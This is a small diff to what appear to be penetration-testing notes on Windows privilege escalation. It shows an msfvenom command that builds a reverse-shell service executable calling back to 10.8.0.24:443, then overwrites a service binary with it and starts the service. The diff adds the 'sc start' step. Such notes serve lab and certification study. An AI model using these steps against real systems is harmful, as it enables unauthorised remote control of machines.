@@ -633,7 +633,9 @@ When a service binary appears - create payload to replace that binary with a rev
 msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.8.0.24 LPORT=443 EXIT_FUNC=thread -f exe-service -o service.exe
 
 overwrite the original service binary
-copy .\rev.exe C:\Service_Name\Service_Name.exe 
+copy .\rev.exe C:\Service_Name\Service_Name.exe
+
+sc start Service_Name
 
 get shell from listener
 ```
